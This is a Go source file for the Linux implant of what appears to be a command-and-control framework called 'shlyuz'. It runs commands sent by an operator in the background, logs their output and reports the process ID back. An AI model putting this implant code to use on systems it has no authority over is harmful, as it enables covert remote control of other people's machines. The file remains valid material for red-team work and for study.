//go:build linux,implant && (!lp || !teamserver)

package fireforget

import (
	"bufio"
	"errors" // For errors.New
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings"
)

func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader) error {
	log.Printf("CmdID %s (Linux): Preparing to fire and forget command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string // For logging consistency

	if cmdDetails.Type == "Shell" {
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" {
			errMsg := "Args string is empty or invalid for Shell execution."
			log.Printf("CmdID %s (Linux): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg:
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
			return errors.New(errMsg) 
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args 
		log.Printf("CmdID %s (Linux): Using Shell execution (split args). Command: %s, Args: %v", cmdDetails.Id, executable, args)
	} else { // Direct execution for non-Shell type
		command = exec.Command(cmdDetails.Args)
		displayCmdLine = cmdDetails.Args
		log.Printf("CmdID %s (Linux): Using Direct execution. Command: %s", cmdDetails.Id, cmdDetails.Args)
	}

	// Handle stdin
	if inPipe != nil {
		stdin, err := command.StdinPipe()
		if err != nil {
			errMsg := "Error creating StdinPipe"
			log.Printf("CmdID %s (Linux): %s: %v. Command: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- errMsg + ": " + err.Error():
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
			return err
		}
		go func() {
			defer stdin.Close()
			log.Printf("CmdID %s (Linux): Piping input to command. Command: %s", cmdDetails.Id, displayCmdLine)
			if _, errCopy := io.Copy(stdin, inPipe); errCopy != nil {
				log.Printf("CmdID %s (Linux): Error writing to stdin pipe: %v. Command: %s", cmdDetails.Id, errCopy, displayCmdLine)
			}
			log.Printf("CmdID %s (Linux): Finished piping input. Command: %s", cmdDetails.Id, displayCmdLine)
		}()
	}

	// Setup Stdout pipe for draining and logging
	cmdOutReader, err := command.StdoutPipe()
	if err != nil {
		errMsg := "Error creating StdoutPipe for draining"
		log.Printf("CmdID %s (Linux): %s: %v. Command: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	outScanner := bufio.NewScanner(cmdOutReader)
	go func() {
		log.Printf("CmdID %s (Linux): Goroutine started for draining stdout. Command: %s", cmdDetails.Id, displayCmdLine)
		for outScanner.Scan() {
			log.Printf("CmdID %s (Linux stdout): %s", cmdDetails.Id, outScanner.Text())
		}
		if errScan := outScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Linux): Error draining stdout: %v. Command: %s", cmdDetails.Id, errScan, displayCmdLine)
		}
		log.Printf("CmdID %s (Linux): Goroutine finished draining stdout. Command: %s", cmdDetails.Id, displayCmdLine)
	}()

	// Setup Stderr pipe for draining and logging
	cmdErrReader, err := command.StderrPipe()
	if err != nil {
		errMsg := "Error creating StderrPipe for draining"
		log.Printf("CmdID %s (Linux): %s: %v. Command: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	errScanner := bufio.NewScanner(cmdErrReader)
	go func() {
		log.Printf("CmdID %s (Linux): Goroutine started for draining stderr. Command: %s", cmdDetails.Id, displayCmdLine)
		for errScanner.Scan() {
			log.Printf("CmdID %s (Linux stderr): %s", cmdDetails.Id, errScanner.Text())
		}
		if errScan := errScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Linux): Error draining stderr: %v. Command: %s", cmdDetails.Id, errScan, displayCmdLine)
		}
		log.Printf("CmdID %s (Linux): Goroutine finished draining stderr. Command: %s", cmdDetails.Id, displayCmdLine)
	}()

	// Start the command
	if err := command.Start(); err != nil {
		errMsg := "Error starting command"
		log.Printf("CmdID %s (Linux): %s '%s': %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Linux): Command '%s' started successfully in background (PID: %d).", cmdDetails.Id, displayCmdLine, command.Process.Pid)

	// Send PID
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Linux): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}
	return nil // Indicates successful start
}
